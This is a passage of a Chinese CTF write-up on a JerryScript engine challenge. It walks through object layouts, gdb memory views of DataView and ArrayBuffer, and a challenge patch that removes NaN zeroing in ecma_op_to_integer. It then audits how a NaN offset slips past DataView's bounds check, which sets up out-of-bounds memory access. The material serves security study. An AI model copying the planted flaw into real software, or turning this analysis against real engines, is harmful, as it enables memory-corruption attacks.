class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">ecma_value_t</span> script_value; <span class="hljs-comment">/**&lt; script value */</span><br>      <span class="hljs-type">uint8_t</span> flags; <span class="hljs-comment">/**&lt; constructor flags */</span><br>    &#125; constructor_function;<br>  &#125; u;<br>&#125; <span class="hljs-type">ecma_extended_object_t</span>;<br></code></pre></td></tr></table></figure>
+
+
+<p>简化完毕其实是这样。ecma_object_t object和一个union u</p>
+<p>其中的object就是上方的通用类型的header，对于复杂类型会使用到ecma_extended_object_t，其中的union u会根据不同的类型选择不同的字段，以此定义不同对象的属性字段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">ecma_object_t</span> object; <br><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">uint8_t</span> type;   <br>      <br>      <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">uint8_t</span> array_buffer_flags; <br>        <span class="hljs-type">uint8_t</span> typedarray_type;    <br>      &#125; u1;<br>      <br>      <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">uint16_t</span> typedarray_flags;<br>      &#125; u2;<br>      <br>      <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">uint32_t</span> length;        <br>        <span class="hljs-type">ecma_value_t</span> arraybuffer; <br>        <span class="hljs-type">ecma_value_t</span> value;     <br>      &#125; u3;<br>    &#125; cls;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">uint32_t</span> length;                     <br>      <span class="hljs-type">uint32_t</span> length_prop_and_hole_count; <br>    &#125; <span class="hljs-built_in">array</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">jmem_cpointer_tag_t</span> scope_cp;    <br>      <span class="hljs-type">ecma_value_t</span> bytecode_cp;        <br>    &#125; function;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">jmem_cpointer_tag_t</span> target_function; <br>      <span class="hljs-type">ecma_value_t</span> args_len_or_this;       <br>    &#125; bound_function;<br><br>  &#125; u;<br>&#125; <span class="hljs-type">ecma_extended_object_t</span>;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="类型调试实例"><a href="#类型调试实例" class="headerlink" title="类型调试实例"></a>类型调试实例</h2><blockquote>
+<p>下面笔者迁移了部分v8 exploit的知识，通过ai写出了一个针对于jerryscript调试的gdb插件，提升了调试的效率</p>
+</blockquote>
+<p>这里以dataview为例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(ab,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>);<br>dv.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">0x00</span>,<span class="hljs-number">0x41414141</span>,<span class="hljs-literal">true</span>);<br><br></code></pre></td></tr></table></figure>
+
+
+<p>dataview的定义</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">ecma_extended_object_t</span> header; <span class="hljs-comment">/**&lt; header part */</span><br>  <span class="hljs-type">ecma_object_t</span> *buffer_p; <span class="hljs-comment">/**&lt; [[ViewedArrayBuffer]] internal slot */</span><br>  <span class="hljs-type">uint32_t</span> byte_offset; <span class="hljs-comment">/**&lt; [[ByteOffset]] internal slot */</span><br>&#125; <span class="hljs-type">ecma_dataview_object_t</span>;<br></code></pre></td></tr></table></figure>
+
+
+<p>arraybuffer的定义</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">ecma_extended_object_t</span> extended_object; <span class="hljs-comment">/**&lt; extended object part */</span><br>  <span class="hljs-type">void</span> *buffer_p; <span class="hljs-comment">/**&lt; pointer to the backing store of the array buffer object */</span><br>  <span class="hljs-type">void</span> *arraybuffer_user_p; <span class="hljs-comment">/**&lt; user pointer passed to the free callback */</span><br>&#125; <span class="hljs-type">ecma_arraybuffer_pointer_t</span>;<br></code></pre></td></tr></table></figure>
+
+
+<p>实际内存中是这样的，后方的0x10是对应的byte_offset。0x64eccc323748是arraybuffer的地址</p>
+<blockquote>
+<p>注意下方的0x41414141，这里是对应的inline表示，这个并不利于后续的利用，这个是利用的后话了</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_5vxo8bDWoJ.png" srcset="/img/loading.gif" lazyload></p>
+<p>如何让arraybuffer分配出一个raw pointer呢？这里只需要提高arraybuffer分配的大小即可，我这里提升到了0x1000</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_O4mRWYhVpL.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h2><p>diff的内容</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/jerry-core/ecma/operations/ecma-conversion.c b/jerry-core/ecma/operations/ecma-conversion.c</span><br><span class="hljs-comment">index cf0c9fde..5c1b7aa2 100644</span><br><span class="hljs-comment">--- a/jerry-core/ecma/operations/ecma-conversion.c</span><br><span class="hljs-comment">+++ b/jerry-core/ecma/operations/ecma-conversion.c</span><br><span class="hljs-meta">@@ -905,7 +905,6 @@</span> ecma_op_to_integer (ecma_value_t value, /**&lt; ecma value */<br>   /* 3 */<br>   if (ecma_number_is_nan (number))<br>   &#123;<br><span class="hljs-deletion">-    *number_p = ECMA_NUMBER_ZERO;</span><br>     return ECMA_VALUE_EMPTY;<br>   &#125;<br> <br><br></code></pre></td></tr></table></figure>
+
+
+<p>删去了一个对于nan的检查，定位源码可以找到代码的上下文，调用函数是[A] ecma_op_to_integer，从而可以找到上层的调用上下文分别是[B] ecma_op_to_length和[C] ecma_op_to_index函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ecma_value_t</span><br><span class="hljs-title function_">ecma_op_to_integer</span> <span class="hljs-params">(<span class="hljs-type">ecma_value_t</span> value, <span class="hljs-comment">/**&lt; ecma value */</span></span><br><span class="hljs-params">                    <span class="hljs-type">ecma_number_t</span> *number_p)</span> <span class="hljs-comment">/**&lt; [out] ecma number */</span><br>&#123;<span class="hljs-comment">// [A] </span><br>......<br><br>  <span class="hljs-type">ecma_number_t</span> number = *number_p;<br><br>  <span class="hljs-comment">/* 3 */</span><br>  <span class="hljs-keyword">if</span> (ecma_number_is_nan (number))<br>  &#123;<br>    <span class="hljs-keyword">return</span> ECMA_VALUE_EMPTY;<br>  &#125;<br><br> ......<br><br><span class="hljs-type">ecma_value_t</span><br><span class="hljs-title function_">ecma_op_to_length</span> <span class="hljs-params">(<span class="hljs-type">ecma_value_t</span> value, <span class="hljs-comment">/**&lt; ecma value */</span></span><br><span class="hljs-params">                   <span class="hljs-type">ecma_length_t</span> *length)</span> <span class="hljs-comment">/**&lt; [out] ecma number */</span><br>&#123;<span class="hljs-comment">//[B] </span><br>  <span class="hljs-comment">/* 1 */</span><br>  <span class="hljs-keyword">if</span> (ECMA_IS_VALUE_ERROR (value))<br>  &#123;<br>    <span class="hljs-keyword">return</span> value;<br>  &#125;<br><br>  <span class="hljs-comment">/* 2 */</span><br>  <span class="hljs-type">ecma_number_t</span> num;<br>  <span class="hljs-type">ecma_value_t</span> length_num = ecma_op_to_integer (value, &amp;num);<br> <br> ......<br><span class="hljs-type">ecma_value_t</span><br><span class="hljs-title function_">ecma_op_to_index</span> <span class="hljs-params">(<span class="hljs-type">ecma_value_t</span> value, <span class="hljs-comment">/**&lt; ecma value */</span></span><br><span class="hljs-params">                  <span class="hljs-type">ecma_number_t</span> *index)</span> <span class="hljs-comment">/**&lt; [out] ecma number */</span><br>&#123;<span class="hljs-comment">//[C] </span><br>  <span class="hljs-comment">/* 1. */</span><br>  <span class="hljs-keyword">if</span> (ecma_is_value_undefined (value))<br>  &#123;<br>    *index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> ECMA_VALUE_EMPTY;<br>  &#125;<br><br>  <span class="hljs-comment">/* 2.a */</span><br>  <span class="hljs-type">ecma_number_t</span> integer_index;<br>  <span class="hljs-type">ecma_value_t</span> index_value = ecma_op_to_integer (value, &amp;integer_index);<br><br></code></pre></td></tr></table></figure>
+
+
+<p>接着就是更上层的调用查找，对于ecma_op_to_length来说，更多的是倾向于被字符串和regexp的处理，如果存在漏洞，那么品相也不一定很好，所以我这里继续看了ecma_op_to_index的上层调用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_EYdOS9U5W9.png" srcset="/img/loading.gif" lazyload></p>
+<p>ecma_op_to_index的上层调用如下，这里可以看到很具有代表意义的两个对象，dataview和typearray，如果熟悉v8 exploit的话，这里两个对象的嫌疑最大 ，事实也确实如此，所以接下来继续审计dataview相关的实现</p>
+<blockquote>
+<p>typearray的代码似乎没有很明显的漏洞，因此主要审计了dataview</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_iFaa3Fi7U5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="dataview相关代码审计"><a href="#dataview相关代码审计" class="headerlink" title="dataview相关代码审计"></a>dataview相关代码审计</h2><h3 id="dataview与arraybuffer对象的结构"><a href="#dataview与arraybuffer对象的结构" class="headerlink" title="dataview与arraybuffer对象的结构"></a>dataview与arraybuffer对象的结构</h3><p>首先我们得看一下jerryscript中的dataview对象的结构，所有对象的结果为与这个文件下jerryscript&#x2F;jerry-core&#x2F;ecma&#x2F;base&#x2F;ecma-globals.h</p>
+<p>可以看到使用了ecma_extended_object_t的header，这个是对于复杂对象的header，其中集成了ecma_object_t的内容。接着又一个buffer_p指针，这个其实指向了Arraybuffer，接着是对应的byte_offset，用户索引Arraybuffer中的偏移</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_BUILTIN_DATAVIEW</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Description of DataView objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">ecma_extended_object_t</span> header; <span class="hljs-comment">/**&lt; header part */</span><br>  <span class="hljs-type">ecma_object_t</span> *buffer_p; <span class="hljs-comment">/**&lt; [[ViewedArrayBuffer]] internal slot */</span><br>  <span class="hljs-type">uint32_t</span> byte_offset; <span class="hljs-comment">/**&lt; [[ByteOffset]] internal slot */</span><br>&#125; <span class="hljs-type">ecma_dataview_object_t</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_BUILTIN_DATAVIEW */</span></span><br></code></pre></td></tr></table></figure>
+
+
+<p>接着看Arraybuffer的对象结构，结构很简单，其中的buffer_p也就类似于v8中的backingstore</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">ecma_extended_object_t</span> extended_object; <span class="hljs-comment">/**&lt; extended object part */</span><br>  <span class="hljs-type">void</span> *buffer_p; <span class="hljs-comment">/**&lt; pointer to the backing store of the array buffer object */</span><br>  <span class="hljs-type">void</span> *arraybuffer_user_p; <span class="hljs-comment">/**&lt; user pointer passed to the free callback */</span><br>&#125; <span class="hljs-type">ecma_arraybuffer_pointer_t</span>;<br></code></pre></td></tr></table></figure>
+
+
+<p>接着可以动态的看一下，测试代码入下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(ab,<span class="hljs-number">0x10</span>);<br>dv.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0x11111111</span>,<span class="hljs-literal">true</span>);<br><br></code></pre></td></tr></table></figure>
+
+
+<p>其中地址0x62e46178e5f0中的dword 0x10就是这里设置的byte_offset</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_SZkMe3baKM.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时dataview还支持这样的语法，也就是会有一个view_offset，下发设置了view_offset为0x10，但是索引了0x20的位置，这个是不合法的，会报错</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(ab,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x10</span>);<br>dv.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x11111111</span>,<span class="hljs-literal">true</span>);<span class="hljs-comment">// error</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="dataview中的内存越界"><a href="#dataview中的内存越界" class="headerlink" title="dataview中的内存越界"></a>dataview中的内存越界</h3><p>审计代码路径位于jerryscript&#x2F;jerry-core&#x2F;ecma&#x2F;operations&#x2F;ecma-dataview-object.c</p>
+<h4 id="ecma-op-dataview-create"><a href="#ecma-op-dataview-create" class="headerlink" title="ecma_op_dataview_create"></a>ecma_op_dataview_create</h4><p>先审计ecma_op_dataview_create这个函数，关于dataview对象的创建，代码如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs javascript">ecma_value_t<br><span class="hljs-title function_">ecma_op_dataview_create</span> (<span class="hljs-keyword">const</span> ecma_value_t *arguments_list_p, <span class="hljs-comment">/**&lt; arguments list */</span><br>                         uint32_t arguments_list_len) <span class="hljs-comment">/**&lt; number of arguments */</span><br>&#123;<br>  <span class="hljs-title function_">JERRY_ASSERT</span> (arguments_list_len == <span class="hljs-number">0</span> || arguments_list_p != <span class="hljs-variable constant_">NULL</span>);<br>  <span class="hljs-title function_">JERRY_ASSERT</span> (<span class="hljs-title function_">JERRY_CONTEXT</span> (current_new_target_p));<br><br>  ecma_value_t buffer = arguments_list_len &gt; <span class="hljs-number">0</span> ? arguments_list_p[<span class="hljs-number">0</span>] : <span class="hljs-variable constant_">ECMA_VALUE_UNDEFINED</span>;<br><br>  <span class="hljs-comment">/* 2. */</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">ecma_is_value_object</span> (buffer))<br>  &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ecma_raise_type_error</span> (<span class="hljs-variable constant_">ECMA_ERR_ARGUMENT_BUFFER_NOT_OBJECT</span>);<br>  &#125;<br><br>  ecma_object_t *buffer_p = <span class="hljs-title function_">ecma_get_object_from_value</span> (buffer);<br><br>  <span class="hljs-keyword">if</span> (!(<span class="hljs-title function_">ecma_object_class_is</span> (buffer_p, <span class="hljs-variable constant_">ECMA_OBJECT_CLASS_ARRAY_BUFFER</span>)<br>        || <span class="hljs-title function_">ecma_object_is_shared_arraybuffer</span> (buffer_p)))<br>  &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ecma_raise_type_error</span> (<span class="hljs-variable constant_">ECMA_ERR_ARGUMENT_BUFFER_NOT_ARRAY_OR_SHARED_BUFFER</span>);<br>  &#125;<br><br>  <span class="hljs-comment">/* 3. */</span><br>  ecma_number_t offset = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (arguments_list_len &gt; <span class="hljs-number">1</span>)<br>  &#123;<br>    ecma_value_t offset_value = <span class="hljs-title function_">ecma_op_to_index</span> (arguments_list_p[<span class="hljs-number">1</span>], &amp;offset);<span class="hljs-comment">//[a]</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ECMA_IS_VALUE_ERROR</span> (offset_value))<br>    &#123;<br>      <span class="hljs-keyword">return</span> offset_value;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">/* 4. */</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ecma_arraybuffer_is_detached</span> (buffer_p))<br>  &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ecma_raise_type_error</span> (<span class="hljs-variable constant_">ECMA_ERR_ARRAYBUFFER_IS_DETACHED</span>);<br>  &#125;<br><br>  <span class="hljs-comment">/* 5. */</span><br>  ecma_number_t buffer_byte_length = <span class="hljs-title function_">ecma_arraybuffer_get_length</span> (buffer_p);<br><br>  <span class="hljs-comment">/* 6. */</span><br>  <span class="hljs-keyword">if</span> (offset &gt; buffer_byte_length)<br>  &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ecma_raise_range_error</span> (<span class="hljs-variable constant_">ECMA_ERR_START_OFFSET_IS_OUTSIDE_THE_BOUNDS_OF_THE_BUFFER</span>);<br>  &#125;<br><br>  <span class="hljs-comment">/* 7. */</span><br>  uint32_t view_byte_length;<br>  <span class="hljs-keyword">if</span> (arguments_list_len &gt; <span class="hljs-number">2</span> &amp;&amp; !<span class="hljs-title function_">ecma_is_value_undefined</span> (arguments_list_p[<span class="hljs-number">2</span>]))<br>  &#123;<br>    <span class="hljs-comment">/* 8.a */</span><br>    ecma_number_t byte_length_to_index;<br>    ecma_value_t byte_length_value = <span class="hljs-title function_">ecma_op_to_index</span> (arguments_list_p[<span class="hljs-number">2</span>], &amp;byte_length_to_index);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ECMA_IS_VALUE_ERROR</span> (byte_length_value))<br>    &#123;<br>      <span class="hljs-keyword">return</span> byte_length_value;<br>    &#125;<br><br>    <span class="hljs-comment">/* 8.b */</span><br>    <span class="hljs-keyword">if</span> (offset + byte_length_to_index &gt; buffer_byte_length)<span class="hljs-comment">//[b]</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">ecma_raise_range_error</span> (<span class="hljs-variable constant_">ECMA_ERR_START_OFFSET_IS_OUTSIDE_THE_BOUNDS_OF_THE_BUFFER</span>);<br>    &#125;<br><br>    <span class="hljs-title function_">JERRY_ASSERT</span> (byte_length_to_index &lt;= <span class="hljs-title class_">UINT32</span>_MAX);<br>    view_byte_length = (uint32_t) byte_length_to_index;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-comment">/* 7.a */</span><br>    view_byte_length = (uint32_t) (buffer_byte_length - offset);<br>  &#125;<br><br>  <span class="hljs-comment">/* 9. */</span><br>  ecma_object_t *prototype_obj_p =<br>    <span class="hljs-title function_">ecma_op_get_prototype_from_constructor</span> (<span class="hljs-title function_">JERRY_CONTEXT</span> (current_new_target_p), <span class="hljs-variable constant_">ECMA_BUILTIN_ID_DATAVIEW_PROTOTYPE</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">JERRY_UNLIKELY</span> (prototype_obj_p == <span class="hljs-variable constant_">NULL</span>))<br>  &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">ECMA_VALUE_ERROR</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/* 10. */</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ecma_arraybuffer_is_detached</span> (buffer_p))<br>  &#123;<br>    <span class="hljs-title function_">ecma_deref_object</span> (prototype_obj_p);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ecma_raise_type_error</span> (<span class="hljs-variable constant_">ECMA_ERR_ARRAYBUFFER_IS_DETACHED</span>);<br>  &#125;<br><br>  <span class="hljs-comment">/* 9. */</span><br>  <span class="hljs-comment">/* It must happen after 10., because uninitialized object can&#x27;t be destroyed properly. */</span><br>  ecma_object_t *object_p =<br>    <span class="hljs-title function_">ecma_create_object</span> (prototype_obj_p, <span class="hljs-title function_">sizeof</span> (ecma_dataview_object_t), <span class="hljs-variable constant_">ECMA_OBJECT_TYPE_CLASS</span>);<br><br>  <span class="hljs-title function_">ecma_deref_object</span> (prototype_obj_p);<br><br>  <span class="hljs-comment">/* 11 - 14. */</span><br>  ecma_dataview_object_t *dataview_obj_p = (ecma_dataview_object_t *) object_p;<br>  dataview_obj_p-&gt;header.<span class="hljs-property">u</span>.<span class="hljs-property">cls</span>.<span class="hljs-property">type</span> = <span class="hljs-variable constant_">ECMA_OBJECT_CLASS_DATAVIEW</span>;<br>  dataview_obj_p-&gt;header.<span class="hljs-property">u</span>.<span class="hljs-property">cls</span>.<span class="hljs-property">u3</span>.<span class="hljs-property">length</span> = view_byte_length;<br>  dataview_obj_p-&gt;buffer_p = buffer_p;<br>  dataview_obj_p-&gt;byte_offset = (uint32_t) offset;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">ecma_make_object_value</span> (object_p);<br>&#125; <span class="hljs-comment">/* ecma_op_dataview_create */</span><br><br></code></pre></td></tr></table></figure>
+
+
+<p>这里首先会通过参数列表获取到buffer，这个就是Arraybuffer，接着会检查这个用户传入的Arraybuffer的值是否合法，也就是真实类型是否为Arraybuffer</p>
+<p>接着通过参数列表为offset赋值，同时检查是否有问题，可以看到上方[a]处调用了ecma_op_to_index，这个函数涉及到nan的处理，正常遇到nan会将nan清空为0，并返回正常的状态码ECMA_VALUE_EMPTY，但是这里没有清空，所以会正常绕过这个检查，并保留原有的nan的值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_ck0Yq548M6.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着获取Arraybuffer的长度，并赋值给buffer_byte_length。然后进入if (offset &gt; buffer_byte_length)判断</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_ovbjxzsKHt.png" srcset="/img/loading.gif" lazyload></p>
+<p>问题其实就出现在这个地方，这里的比较逻辑是将nan的值从栈上取出来，赋值给xmm0，也就是浮点数寄存器，接着调用comisd进行比较。</p>
